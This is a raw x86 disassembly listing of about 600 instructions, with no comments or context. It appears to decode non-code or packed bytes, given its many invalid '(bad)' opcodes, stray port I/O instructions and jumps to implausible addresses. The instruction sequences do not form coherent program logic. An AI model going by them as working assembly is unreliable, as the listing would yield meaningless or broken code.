  4195e3:	fldcw  WORD PTR [edi]
  4195e5:	out    dx,eax
  4195e6:	jmp    0x41956d
  4195e8:	mov    esi,0x9a0b9a02
  4195ed:	jmp    0xee8f68f
  4195f2:	shl    DWORD PTR [ecx+ecx*2+0x89554fd],1
  4195f9:	lods   eax,DWORD PTR ds:[esi]
  4195fa:	dec    ebx
  4195fb:	in     eax,dx
  4195fc:	mov    al,ds:0x39e86a68
  419601:	das    
  419602:	mov    dl,0x77
  419604:	xlat   BYTE PTR ds:[ebx]
  419605:	xor    al,0x45
  419607:	sbb    BYTE PTR [ecx+0x7f],dl
  41960a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41960b:	cmp    al,0x88
  41960d:	outs   dx,BYTE PTR ds:[esi]
  41960e:	sbb    DWORD PTR [esi-0x36],0x331a4140
  419615:	xchg   esi,eax
  419616:	dec    esp
  419617:	pop    edi
  419618:	imul   edi,DWORD PTR [eax-0x59],0xdbd1593e
  41961f:	rol    DWORD PTR [ebx-0x8],1
  419622:	and    dl,BYTE PTR [ebx-0x1c9016a8]
  419628:	pop    esi
  419629:	out    dx,eax
  41962a:	pop    ecx
  41962b:	rcl    DWORD PTR [ebx+0x7c],0x56
  41962f:	loope  0x4196a2
  419631:	test   eax,0xfe309f44
  419636:	and    al,0x5d
  419638:	xlat   BYTE PTR ds:[ebx]
  419639:	out    dx,al
  41963a:	aam    0x20
  41963c:	int3   
  41963d:	cwde   
  41963e:	push   esi
  41963f:	out    dx,eax
  419640:	mov    edi,0xb42d753b
  419645:	lea    esp,[esi+0x7d]
  419648:	cli    
  419649:	mov    ebp,0x7d107f9f
  41964e:	mov    ebx,0xf250c285
  419653:	dec    eax
  419654:	leave  
  419655:	dec    edi
  419656:	and    al,BYTE PTR [eax]
  419658:	add    edi,ecx
  41965a:	in     al,0x23
  41965c:	fstp   DWORD PTR [edx]
  41965e:	out    0x4,eax
  419660:	cs ins BYTE PTR es:[edi],dx
  419662:	add    ah,BYTE PTR [esi+0x73]
  419665:	enter  0x2cba,0x62
  419669:	gs mov ebp,0x8a22b0b4
  41966f:	(bad)  [edx]
  419671:	and    al,cl
  419673:	sub    eax,0x9d21184
  419678:	jp     0x41962f
  41967a:	sub    cl,cl
  41967c:	adc    ax,0xae16
  419680:	cs pop ss
  419682:	out    0xc4,al
  419684:	aam    0x70
  419686:	mov    WORD PTR [esi],?
  419688:	mov    edx,0x1e7941ac
  41968d:	pushf  
  41968e:	ins    BYTE PTR es:[edi],dx
  41968f:	out    0x5f,eax
  419691:	arpl   WORD PTR [ecx-0x2cca7c85],bx
  419697:	pusha  
  419698:	lock bound ebp,QWORD PTR es:[edx-0x2b]
  41969d:	sub    BYTE PTR ds:0xd107e025,0xc6
  4196a4:	fwait
  4196a5:	jo     0x4196b0
  4196a7:	xchg   ecx,eax
  4196a8:	lods   eax,DWORD PTR ds:[esi]
  4196a9:	loop   0x419666
  4196ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ac:	xchg   ecx,eax
  4196ad:	jl     0x41972c
  4196af:	adc    cl,BYTE PTR es:[edx-0x548c1311]
  4196b6:	mov    edi,0xbe221e0b
  4196bb:	repz pushf 
  4196bd:	mov    esi,0x5db9bcc6
  4196c2:	pop    edi
  4196c3:	sar    DWORD PTR [ebx-0xb],0x0
  4196c7:	(bad)  
  4196c9:	sub    al,0xa2
  4196cb:	or     al,0xb0
  4196cd:	push   edi
  4196ce:	loop   0x419709
  4196d0:	xchg   DWORD PTR [ebp+0x2e688993],esi
  4196d6:	stc    
  4196d7:	mov    eax,0x6c356fae
  4196dc:	imul   ebp,esi,0x9fa405b4
  4196e2:	add    DWORD PTR [ebx+0x9ebff2d],esi
  4196e8:	daa    
  4196e9:	ins    DWORD PTR es:[edi],dx
  4196ea:	jmp    0xb393e444
  4196ef:	push   ebx
  4196f0:	arpl   bp,cx
  4196f2:	sub    al,0xd7
  4196f4:	ficom  WORD PTR [esi-0x519a74b1]
  4196fa:	push   edx
  4196fb:	pop    es
  4196fc:	xchg   esp,eax
  4196fd:	jle    0x4196c7
  4196ff:	push   ebx
  419700:	mov    al,0xb
  419702:	xor    eax,esi
  419704:	into   
  419705:	add    al,0x75
  419707:	xchg   esi,eax
  419708:	in     al,dx
  419709:	outs   dx,DWORD PTR ds:[esi]
  41970a:	outs   dx,DWORD PTR ds:[esi]
  41970b:	push   ds
  41970c:	xor    esi,DWORD PTR [ecx+0x5adae9ae]
  419712:	mov    edx,DWORD PTR [edi+0xebfe6ed]
  419718:	xchg   ebp,eax
  419719:	not    BYTE PTR [eax-0x7a28bce6]
  41971f:	jg     0x419700
  419721:	bound  edx,QWORD PTR [ebx-0x3791ffbb]
  419727:	jne    0x419722
  419729:	xchg   ecx,eax
  41972a:	add    al,0xef
  41972c:	stos   DWORD PTR es:[edi],eax
  41972d:	repnz cmp dl,ch
  419730:	push   ecx
  419731:	xor    BYTE PTR [esp+eiz*4-0x58fdd1f6],ch
  419738:	fwait
  419739:	push   0xffffff81
  41973b:	cmc    
  41973c:	cmp    al,0x1
  41973e:	aam    0x33
  419740:	test   BYTE PTR [edi+0x7],ah
  419743:	jns    0x4196cc
  419745:	pop    ss
  419746:	push   edi
  419747:	inc    esi
  419748:	push   es
  419749:	adc    DWORD PTR [eax-0x53],ebp
  41974c:	sub    al,0xf5
  41974e:	inc    ebp
  41974f:	out    dx,eax
  419750:	mov    ah,BYTE PTR [edx-0x538b9cf8]
  419756:	fisttp WORD PTR [esi-0x4448af75]
  41975c:	add    ch,BYTE PTR ds:0x56e84f14
  419762:	xchg   esi,eax
  419763:	inc    edx
  419764:	outs   dx,DWORD PTR ds:[esi]
  419765:	in     eax,dx
  419766:	out    0x9f,eax
  419768:	and    BYTE PTR [esi-0x1e44f2b3],ah
  41976e:	out    dx,eax
  41976f:	ins    BYTE PTR es:[edi],dx
  419770:	sub    DWORD PTR [edx+0x37b6dee7],edi
  419776:	(bad)  
  419778:	test   al,0x6b
  41977a:	lock push ebx
  41977c:	in     eax,0xfe
  41977e:	jmp    0x1ead816c
  419783:	retf   0x2a88
  419786:	int3   
  419787:	push   cs
  419788:	inc    edi
  419789:	shl    BYTE PTR [edi-0x52bac7d3],cl
  41978f:	xchg   ebp,eax
  419790:	jge    0x4197a2
  419792:	loope  0x4197f5
  419794:	xchg   ebx,eax
  419795:	into   
  419796:	iret   
  419797:	aad    0x36
  419799:	int3   
  41979a:	push   esp
  41979b:	not    BYTE PTR [edx+ecx*8]
  41979e:	clc    
  41979f:	jne    0x4197a7
  4197a1:	add    DWORD PTR [ebx-0x3ef515f8],edx
  4197a7:	scas   al,BYTE PTR es:[edi]
  4197a8:	sub    esi,DWORD PTR [ecx-0x4d728253]
  4197ae:	shr    DWORD PTR [ebx],cl
  4197b0:	test   eax,0xdd387a68
  4197b5:	out    dx,eax
  4197b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197b7:	mov    eax,0x6b98afa1
  4197bc:	into   
  4197bd:	lea    ebp,[eax+0xdec553a]
  4197c3:	pop    esp
  4197c4:	mov    dl,0x1a
  4197c6:	jno    0x4197f3
  4197c8:	fidivr DWORD PTR [esp+ecx*2-0x343f9ab8]
  4197cf:	aad    0x54
  4197d1:	pop    ss
  4197d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197d3:	stos   BYTE PTR es:[edi],al
  4197d4:	pusha  
  4197d5:	jmp    0x9c17:0xe86d98
  4197dc:	mov    DWORD PTR [ecx+0x5d703e3b],0x60138e6a
  4197e6:	shl    DWORD PTR [eax+ecx*4],0xe4
  4197ea:	jp     0x41982d
  4197ec:	mov    ds:0x2c4614ac,al
  4197f1:	xchg   edi,eax
  4197f2:	into   
  4197f3:	imul   ebx,DWORD PTR [ecx+0x3092f315],0xd7f65717
  4197fd:	inc    edi
  4197fe:	mov    ah,0xc2
  419800:	sub    eax,0xfa1899
  419805:	jl     0x41987c
  419807:	mov    WORD PTR [ebp-0x712912f3],es
  41980d:	addr16 sbb ecx,edx
  419810:	xchg   edi,eax
  419811:	outs   dx,BYTE PTR ds:[esi]
  419812:	outs   dx,DWORD PTR ds:[esi]
  419813:	(bad)  
  419814:	push   ecx
  419815:	pushf  
  419816:	pop    es
  419817:	inc    ebx
  419818:	leave  
  419819:	cmp    al,0x52
  41981b:	adc    bh,bh
  41981d:	cld    
  41981e:	push   ecx
  41981f:	dec    ebx
  419820:	mov    esp,0x35c263ef
  419825:	dec    esi
  419826:	bound  ebx,QWORD PTR [eax]
  419828:	fidivr WORD PTR [edx]
  41982a:	jne    0x4197db
  41982c:	loope  0x419838
  41982e:	fiadd  WORD PTR [ebp-0x7bde9444]
  419834:	pop    ebx
  419835:	mov    ecx,esi
  419837:	sub    DWORD PTR [ebx+0x12],ebp
  41983a:	iret   
  41983b:	push   edx
  41983c:	rcl    bh,0x12
  41983f:	xchg   eax,ebx
  419841:	scas   eax,DWORD PTR es:[edi]
  419842:	mov    cl,0x53
  419844:	shr    ecx,1
  419846:	sub    eax,DWORD PTR [edi+edi*2]
  419849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41984a:	fs lahf 
  41984c:	shl    BYTE PTR [ebx],1
  41984e:	stos   DWORD PTR es:[edi],eax
  41984f:	shl    BYTE PTR [eax],1
  419851:	shl    BYTE PTR [ecx-0x23525ecc],cl
  419857:	out    dx,al
  419858:	jp     0x419869
  41985a:	(bad)  
  41985b:	xlat   BYTE PTR ds:[ebx]
  41985c:	fdiv   DWORD PTR [ebp+0x12]
  41985f:	xchg   ebp,eax
  419860:	adc    al,0xf
  419862:	and    esi,DWORD PTR [ecx+0x62]
  419865:	mov    ds:0x6af37cc4,al
  41986a:	test   DWORD PTR [ebx],0x406b297
  419870:	xor    esi,esp
  419872:	push   edi
  419873:	in     al,0x97
  419875:	and    BYTE PTR [edi],bh
  419877:	push   ebp
  419878:	(bad)  
  41987a:	(bad)  
  41987c:	xor    DWORD PTR [esi+esi*2-0x22264e7a],ebp
  419883:	scas   al,BYTE PTR es:[edi]
  419884:	dec    DWORD PTR [ecx]
  419886:	iret   
  419887:	out    0x79,al
  419889:	test   eax,0x83c116d2
  41988e:	stc    
  41988f:	push   ebp
  419890:	fdiv   st(0),st
  419892:	hlt    
  419893:	xlat   BYTE PTR ds:[ebx]
  419894:	fsin   
  419896:	cld    
  419897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419898:	sbb    al,0x76
  41989a:	fmul   QWORD PTR ds:0x6eb8c985
  4198a0:	sahf   
  4198a1:	cwde   
  4198a2:	mov    ebx,DWORD PTR [ebx+esi*8+0x7f]
  4198a6:	and    BYTE PTR [edi+0x48d775a0],ah
  4198ac:	ret    0xb8da
  4198af:	daa    
  4198b0:	sbb    DWORD PTR [edx],esp
  4198b2:	add    ecx,edi
  4198b4:	push   ebx
  4198b5:	or     DWORD PTR [edx+0x53bdf4bd],ebp
  4198bb:	adc    edi,ecx
  4198bd:	out    dx,al
  4198be:	pop    esi
  4198bf:	xor    bl,dl
  4198c1:	cmp    BYTE PTR [edi+0x2a94c51b],ch
  4198c7:	add    edx,DWORD PTR [ebp-0x6ea11a5a]
  4198cd:	(bad)  
  4198ce:	jmp    0x41987c
  4198d0:	fwait
  4198d1:	mov    dh,0x78
  4198d3:	mov    ebp,0x2fe9f902
  4198d8:	push   0x48
  4198da:	(bad)  
  4198db:	loop   0x41993c
  4198dd:	lock push es
  4198df:	pop    ss
  4198e0:	ret    
  4198e1:	test   esi,ebx
  4198e3:	xor    BYTE PTR [edi+0x35],bl
  4198e6:	fistp  WORD PTR [esi]
  4198e8:	inc    ecx
  4198e9:	mov    ch,BYTE PTR [ebp-0x2632576a]
  4198ef:	adc    BYTE PTR [edi+eiz*1],cl
  4198f2:	fwait
  4198f3:	ss jecxz 0x4198c8
  4198f6:	fistp  DWORD PTR ds:0x2ff6eb4a
  4198fc:	adc    DWORD PTR [eax-0x73],ebx
  4198ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419900:	xchg   ebp,eax
  419901:	xor    DWORD PTR [ecx],eax
  419903:	xor    DWORD PTR [esi-0x2b5faf1b],0xa311413a
  41990d:	cmp    al,0x26
  41990f:	ja     0x4198df
  419911:	(bad)  
  419912:	xchg   ebx,eax
  419913:	sti    
  419914:	push   cs
  419915:	mov    ecx,0xd7b1dce5
  41991a:	int3   
  41991b:	out    dx,al
  41991c:	fst    st(3)
  41991e:	mov    ebp,ebx
  419920:	repz or eax,0xfae677bd
  419926:	jl     0x419956
  419928:	cmp    DWORD PTR [ebp-0x47],0xc104e0a6
  41992f:	and    DWORD PTR [edx],ebx
  419931:	xchg   ebp,eax
  419932:	(bad)  
  419933:	retf   0xf630
  419936:	fs and al,0x68
  419939:	mov    cs,WORD PTR [ecx+0x21]
  41993c:	jo     0x41995d
  41993e:	loop   0x41994b
  419940:	mov    al,ds:0x9a4dfa36
  419945:	xchg   edi,eax
  419946:	xchg   ebx,eax
  419947:	sub    dh,BYTE PTR [edx-0x3135a69d]
  41994d:	mov    al,0x35
  41994f:	sub    esi,eax
  419951:	(bad)  
  419952:	sub    ah,BYTE PTR [ecx]
  419954:	rol    BYTE PTR [eax+0xb],1
  419957:	rol    DWORD PTR [esi],0x31
  41995a:	mov    ecx,esi
  41995c:	ret    
  41995d:	es push ss
  41995f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419960:	or     BYTE PTR [ecx-0x8],0x37
  419964:	sbb    BYTE PTR [edi-0x21],dl
  419967:	leave  
  419968:	or     DWORD PTR [edi+edi*2],0x47
  41996c:	lea    esi,[ebx-0x187bf1b6]
  419972:	add    eax,DWORD PTR [edi+ecx*1+0x51]
  419976:	mov    edx,0x7ca180f6
  41997b:	ret    
  41997c:	adc    eax,0xa97ef355
  419981:	test   eax,0xe28262e5
  419986:	sahf   
  419987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419988:	push   esp
  419989:	push   es
  41998a:	inc    edx
  41998b:	das    
  41998c:	inc    esi
  41998d:	pop    ebp
  41998e:	sub    ebp,DWORD PTR [eax+0x55040d32]
  419994:	xor    al,0x3c
  419996:	xor    DWORD PTR [ecx-0x2239ce0d],esi
  41999c:	mov    bl,0x74
  41999e:	and    DWORD PTR [ebp-0x7a],ecx
  4199a1:	inc    ebx
  4199a2:	mov    bh,0xa6
  4199a4:	push   ebx
  4199a5:	cmp    DWORD PTR [esi],0xf9565664
  4199ab:	xchg   ecx,eax
  4199ac:	(bad)  
  4199ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ae:	mov    al,0x2f
  4199b0:	mov    dh,0x76
  4199b2:	inc    esp
  4199b3:	adc    DWORD PTR [edi+0x6],esp
  4199b6:	in     al,0xe
  4199b8:	test   DWORD PTR [ebx],eax
  4199ba:	cdq    
  4199bb:	je     0x41994e
  4199bd:	call   0x6657cb9f
  4199c2:	mov    al,BYTE PTR [ebx+0x2f13f6a2]
  4199c8:	push   edi
  4199c9:	pop    es
  4199ca:	psubw  mm4,mm2
  4199cd:	arpl   WORD PTR [esi],di
  4199cf:	mov    fs,WORD PTR [eax]
  4199d1:	ins    DWORD PTR es:[edi],dx
  4199d2:	ror    BYTE PTR [edx-0x7c0f2c66],1
  4199d8:	and    eax,0xb2b08c2c
  4199dd:	push   eax
  4199de:	jg     0x419977
  4199e0:	inc    esi
  4199e1:	cmp    DWORD PTR [eax],0x4ca85086
  4199e7:	stos   BYTE PTR es:[edi],al
  4199e8:	loop   0x4199b1
  4199ea:	push   esp
  4199eb:	fwait
  4199ec:	xor    BYTE PTR [ebx-0x7004556e],dl
  4199f2:	sbb    esp,eax
  4199f4:	sti    
  4199f5:	pop    ecx
  4199f6:	or     cl,dl
  4199f8:	sahf   
  4199f9:	jecxz  0x419a6a
  4199fb:	rol    BYTE PTR [ebp+0x62],cl
  4199fe:	loop   0x419a61
  419a00:	stc    
  419a01:	and    BYTE PTR [ecx+ebx*2+0x32e44cf9],bl
  419a08:	out    0x28,eax
  419a0a:	mov    esp,0xf4999f17
  419a0f:	mov    ah,0xee
  419a11:	test   eax,0xf5d726e2
  419a16:	sub    edi,DWORD PTR [edi-0x20f7ee99]
  419a1c:	repz xchg ecx,eax
  419a1e:	or     ebp,ebp
  419a20:	adc    ecx,eax
  419a22:	add    eax,0x45ee49c3
  419a27:	push   edi
  419a28:	mov    dh,bl
  419a2a:	cmc    
  419a2b:	cmc    
  419a2c:	sub    eax,0x834dd4bb
  419a31:	test   eax,0xfc6c8cba
  419a36:	test   eax,0x92483b83
  419a3b:	mov    BYTE PTR [ebx+ebp*1],bl
  419a3e:	cmp    al,dh
  419a40:	stos   DWORD PTR es:[edi],eax
  419a41:	je     0x4199d5
  419a43:	iret   
  419a44:	add    BYTE PTR [ebp+0x1f],0xc6
  419a48:	outs   dx,DWORD PTR ds:[esi]
  419a49:	mov    DWORD PTR [eax-0xd],0xff216c8e
  419a50:	and    edi,DWORD PTR [ebx-0x45]
  419a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a54:	fwait
  419a55:	pop    ebx
  419a56:	mov    edx,0x791555d6
  419a5b:	xor    eax,0xe6b1ddd1
  419a60:	dec    edi
  419a61:	push   ebx
  419a62:	and    al,dh
  419a64:	mov    ds:0x3e569f08,al
  419a69:	imul   edi,DWORD PTR [ecx-0x42],0xffffff89
  419a6d:	sub    eax,0x1e4d55c1
  419a72:	lea    esi,[esi+ecx*2+0xb]
  419a76:	adc    al,0xf9
  419a78:	retf   0x9053
  419a7b:	xlat   BYTE PTR ds:[ebx]
  419a7c:	jnp    0x419a83
  419a7e:	lock call dx
  419a82:	push   es
  419a83:	and    ebp,eax
  419a85:	cld    
  419a86:	sbb    eax,0x5a90ef24
  419a8b:	aam    0x3f
  419a8d:	xchg   ebx,eax
  419a8e:	dec    ecx
  419a8f:	gs sub al,0x19
  419a92:	push   es
  419a93:	lahf   
  419a94:	out    dx,eax
  419a95:	addr16 inc eax
  419a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a98:	mov    edx,DWORD PTR [edx+0x79]
  419a9b:	iret   
  419a9c:	and    ebp,DWORD PTR [ebx+0x47]
  419a9f:	inc    ecx
  419aa0:	js     0x419a40
  419aa2:	out    dx,al
  419aa3:	xchg   ecx,eax
  419aa4:	mov    eax,ds:0xa73ff6d9
  419aa9:	xor    al,ch
  419aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aac:	dec    edx
  419aad:	jecxz  0x419ad8
  419aaf:	lods   eax,DWORD PTR ds:[esi]
  419ab0:	xor    esp,edx
  419ab2:	pop    esi
  419ab3:	mov    ecx,0x8adf9f9b
  419ab8:	inc    esp
  419ab9:	cmp    DWORD PTR [esi],eax
  419abb:	iret   
  419abc:	mov    ?,ebx
  419abe:	cmp    esi,ecx
  419ac0:	addr16 adc eax,eax
  419ac3:	mov    BYTE PTR [eax],al
  419ac5:	sar    BYTE PTR [edx],cl
  419ac7:	sub    al,0xce
  419ac9:	jmp    0x12c3:0xb37e61d4
  419ad0:	test   BYTE PTR [ecx+0x37],bl
  419ad3:	xchg   esp,eax
  419ad4:	and    BYTE PTR [ebx-0x3c60ce86],0xa4
  419adb:	(bad)  
  419adc:	fcomi  st,st(4)
  419ade:	lods   eax,DWORD PTR cs:[esi]
  419ae0:	aas    
  419ae1:	adc    eax,ecx
  419ae3:	or     al,0xa5
  419ae5:	rcr    BYTE PTR [edx+0x33bfd9bb],cl
  419aeb:	icebp  
  419aec:	sub    esi,eax
  419aee:	mov    eax,DWORD PTR [ebp-0x4]
  419af1:	add    esi,edx
  419af3:	cmp    DWORD PTR [eax],esi
  419af5:	mov    eax,DWORD PTR [ebp-0x4]
  419af8:	mov    esi,DWORD PTR [ebp+0x10]
  419afb:	jg     0x41becb
  419b01:	jmp    0x41bebb
  419b06:	push   ecx
  419b07:	bound  esp,QWORD PTR [ebp+0x516ab665]
  419b0d:	jp     0x419af1
  419b0f:	xchg   ebx,eax
  419b10:	js     0x419adb
  419b12:	mov    ecx,0x4782d2b6
  419b17:	fdivr  QWORD PTR [ebx+edi*2+0x18]
  419b1b:	sahf   
  419b1c:	jnp    0x419b99
  419b1e:	fbld   TBYTE PTR [ebx-0x71e7e98c]
  419b24:	adc    al,0x62
  419b26:	push   0x6c
  419b28:	jne    0x419b89
  419b2a:	mov    eax,ds:0x843be5d3
  419b2f:	inc    ebx
  419b30:	int    0xd
  419b32:	daa    
  419b33:	push   cs
  419b34:	mov    dl,0xbd
  419b36:	(bad)  
  419b37:	lods   al,BYTE PTR ds:[esi]
  419b38:	push   eax
  419b39:	scas   al,BYTE PTR es:[edi]
  419b3a:	push   0xf16420d4
  419b3f:	dec    edi
  419b40:	cli    
  419b41:	sub    edx,DWORD PTR [eax]
  419b43:	test   eax,0x389afcf8
  419b48:	add    bh,dh
  419b4a:	addr16 pop edx
  419b4c:	sbb    bl,BYTE PTR [eax-0x5fd5cc47]
  419b52:	ret    0x28c2
  419b55:	nop
  419b56:	imul   esp,DWORD PTR [eax],0x6f
  419b59:	xor    eax,0xcc28ddc4
  419b5e:	cmp    BYTE PTR [ebp*1-0x3d837c4],0xc7
  419b66:	scas   eax,DWORD PTR es:[edi]
  419b67:	dec    ebx
  419b68:	fcmovbe st,st(1)
  419b6a:	retf   
  419b6b:	add    cl,BYTE PTR [edx+0x53b45099]
  419b71:	stos   BYTE PTR es:[edi],al
  419b72:	mov    dh,BYTE PTR [ebx+ecx*2-0x33ec77c2]
  419b79:	popa   
  419b7a:	sbb    DWORD PTR [ecx+0x773988c9],eax
  419b80:	xchg   edi,eax
  419b81:	push   cs
  419b82:	sub    eax,0x2bafbe27
  419b87:	clc    
  419b88:	out    dx,eax
  419b89:	jecxz  0x419c01
  419b8b:	ins    BYTE PTR es:[edi],dx
  419b8c:	jl     0x419b26
  419b8e:	popf   
  419b8f:	out    dx,al
  419b90:	jo     0x419b2e
  419b92:	mov    edi,0xe881a041
  419b97:	hlt    
  419b98:	nop
  419b99:	dec    edi
  419b9a:	sbb    DWORD PTR [ecx-0x20211fbc],esp
  419ba0:	jne    0x419b84
  419ba2:	dec    eax
  419ba3:	and    eax,0xa2ce497a
  419ba8:	(bad)  [esi-0xa]
  419bab:	cmp    al,0xbb
  419bad:	clc    
  419bae:	inc    eax
  419baf:	xchg   esp,eax
  419bb0:	pop    edi
  419bb1:	pop    ss
  419bb2:	inc    ebp
  419bb3:	xchg   edi,eax
  419bb4:	test   al,0x55
  419bb6:	sbb    al,dl
  419bb8:	nop
  419bb9:	retf   
  419bba:	into   
  419bbb:	and    ebx,esp
  419bbd:	xchg   ebp,eax
  419bbe:	adc    DWORD PTR [edx-0x63c9e91c],ebp
  419bc4:	mov    edi,0xcca5b6e9
  419bc9:	jbe    0x419b8d
  419bcb:	repz or DWORD PTR [edx-0x27561c3b],ecx
  419bd2:	int3   
  419bd3:	addr16 sbb eax,0x3aeb1051
  419bd9:	mov    ecx,0x4b8e01e4
  419bde:	iret   
  419bdf:	and    eax,0x39c2215a
  419be4:	shl    dl,cl
  419be6:	or     ecx,DWORD PTR [ebx+0x34fb7f50]
  419bec:	xor    DWORD PTR [ecx],eax
  419bee:	repnz data16 xor BYTE PTR [ecx+0x88cb89a],bl
  419bf6:	popa   
  419bf7:	je     0x419b88
  419bf9:	mov    esi,0x546aabc0
  419bfe:	mov    dh,BYTE PTR [edx]
  419c00:	out    dx,eax
  419c01:	sbb    BYTE PTR [ebx],dh
  419c03:	mov    edx,0xe448b6dd
  419c08:	rcr    ch,0xcf
  419c0b:	cwde   
  419c0c:	rcr    BYTE PTR [ebx+0x5],1
  419c0f:	push   esp
  419c10:	test   DWORD PTR [ebx],edi
  419c12:	scas   al,BYTE PTR es:[edi]
  419c13:	inc    esp
  419c14:	add    DWORD PTR [ebx-0x5ffcbfa9],0xa3afaba6
  419c1e:	xor    al,0xa1
  419c20:	cmp    eax,0xf81057c8
  419c25:	add    al,ch
  419c27:	fnstsw WORD PTR [ebx]
  419c29:	and    esi,DWORD PTR [edx+0x2513fcb2]
  419c2f:	xor    bh,BYTE PTR [ebx-0x70]
  419c32:	sbb    eax,0xdc905140
  419c37:	leave  
  419c38:	pop    esi
  419c39:	jl     0x419ca0
  419c3b:	sbb    eax,DWORD PTR [ecx]
  419c3d:	jmp    0x419bf4
  419c3f:	aam    0x4e
  419c41:	push   cs
  419c42:	fs sti 
  419c44:	repz and DWORD PTR [edx],0xd7fa4ae4
  419c4b:	nop
  419c4c:	idiv   esp
  419c4e:	retf   0xfaae
  419c51:	aas    
  419c52:	retf   0x12d2
  419c55:	xor    eax,0x9184fa74
  419c5a:	and    al,0xf6
  419c5c:	test   bh,dh
  419c5e:	xchg   esi,eax
  419c5f:	lods   al,BYTE PTR ds:[esi]
  419c60:	sub    eax,0x3ed97a6b
  419c65:	or     DWORD PTR [edx],edx
  419c67:	dec    esp
  419c68:	lds    edx,FWORD PTR [edi+0x3fe7e1e2]
  419c6e:	pop    ebx
  419c6f:	ins    BYTE PTR es:[edi],dx
  419c70:	add    al,0xb0
  419c72:	jnp    0x419c6c
  419c74:	dec    ebp
  419c75:	add    eax,0x11e518dd
  419c7a:	push   ecx
  419c7b:	or     BYTE PTR [edx],cl
  419c7d:	in     eax,dx
  419c7e:	mov    al,ds:0xdbb2f1db
  419c83:	out    dx,eax
  419c84:	sti    
  419c85:	(bad)  
  419c88:	leave  
  419c89:	push   edx
  419c8a:	call   0xa900e972
  419c8f:	cmp    eax,edx
  419c91:	adc    al,0xb4
  419c93:	repz cld 
  419c95:	pop    edx
  419c96:	jecxz  0x419d11
  419c98:	inc    ecx
  419c99:	cmc    
  419c9a:	push   0x1d
  419c9c:	jne    0x419cf1
  419c9e:	ja     0x419cc2
  419ca0:	addr16 (bad) 
  419ca2:	stc    
  419ca3:	xor    ah,bl
  419ca5:	ja     0x419c47
  419ca7:	aad    0x21
  419ca9:	xor    ah,ah
  419cab:	daa    
  419cac:	mov    ah,0x1f
  419cae:	dec    esi
  419caf:	mov    edi,0x8cb431f4
  419cb4:	es das 
  419cb6:	or     eax,0x47ec213
  419cbb:	pop    ecx
  419cbc:	loop   0x419d17
  419cbe:	sti    
  419cbf:	dec    eax
  419cc0:	and    BYTE PTR [ecx],dh
  419cc2:	cld    
  419cc3:	pop    edx
  419cc4:	ficomp WORD PTR [edx-0x1d]
  419cc7:	outs   dx,DWORD PTR ds:[esi]
  419cc8:	mov    ds:0x5d14090c,eax
  419ccd:	dec    esp
  419cce:	pop    ebp
  419ccf:	retf   
  419cd0:	mov    WORD PTR [edx],?
  419cd2:	imul   edi,DWORD PTR ds:0xcb74dadf,0x74
  419cd9:	jo     0x419cff
  419cdb:	jle    0x419ca9
  419cdd:	out    dx,al
  419cde:	inc    ecx
  419cdf:	sub    al,0xfb
  419ce1:	imul   edx,edx,0xffffff8d
  419ce4:	jnp    0x419d55
  419ce6:	pusha  
  419ce7:	pop    ds
  419ce8:	push   0x5d698be3
  419ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cee:	push   es
  419cef:	pop    esp
  419cf0:	cdq    
  419cf1:	dec    ecx
  419cf2:	repnz aam 0xab
  419cf5:	adc    DWORD PTR [eax-0xe],edi
  419cf8:	xor    eax,0xf3f0510c
  419cfd:	dec    ecx
  419cfe:	xchg   ch,bh
  419d00:	test   cl,al
  419d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d03:	xchg   edi,eax
  419d04:	xchg   ecx,eax
  419d05:	or     ch,cl
  419d07:	mov    ds:0x2228d199,al
  419d0c:	test   eax,0x97286038
  419d11:	push   ss
  419d12:	pop    es
  419d13:	jecxz  0x419d46
  419d15:	fs push edi
  419d17:	push   ds
  419d18:	sbb    BYTE PTR [esp+edi*8-0x37],al
  419d1c:	shr    edx,0x4c
  419d1f:	mov    esp,0xe868646
  419d24:	fdivr  DWORD PTR [esi+0x46637191]
  419d2a:	in     al,0xed
  419d2c:	add    al,0x66
  419d2e:	or     BYTE PTR ds:0x55c541e4,bl
  419d34:	push   0xfffffff7
  419d36:	cmp    eax,0x7f4c72
  419d3b:	cmp    BYTE PTR [edi-0xb7f3a21],0x47
  419d42:	or     dl,BYTE PTR [esi+0x6d]
  419d45:	xor    esi,DWORD PTR [ebx-0x10]
  419d48:	fcomp  QWORD PTR [ebx+ebp*1+0x70aa9b13]
  419d4f:	sub    DWORD PTR [edi-0x6e0233f],esi
  419d55:	nop
  419d56:	jno    0x419d19
  419d58:	add    dh,dh
  419d5a:	mov    dl,0xb
  419d5c:	jnp    0x419d4c
  419d5e:	mov    cl,0xd6
  419d60:	outs   dx,BYTE PTR ds:[esi]
  419d61:	cdq    
  419d62:	push   0xd4fcc35a
  419d67:	cld    
  419d68:	xchg   BYTE PTR [ebx+0x2bcef39b],al
  419d6e:	mov    ds:0xd00c2525,eax
  419d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d74:	jecxz  0x419d6a
  419d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d77:	xor    eax,0x1d77a7d4
  419d7c:	or     DWORD PTR [ebx+0x74150957],ecx
  419d82:	jl     0x419daa
  419d84:	jge    0x419de7
  419d86:	cs pop edi
  419d88:	out    dx,al
  419d89:	mov    dl,0xfc
  419d8b:	imul   esp,DWORD PTR [edx+0x445a1061],0x2b
  419d92:	int    0x25
  419d94:	inc    edi
  419d95:	pop    esi
  419d96:	ret    
  419d97:	and    BYTE PTR [edx],bh
  419d99:	fcomp  QWORD PTR [edx-0xf]
  419d9c:	push   ss
  419d9d:	dec    edi
  419d9e:	xor    al,0x84
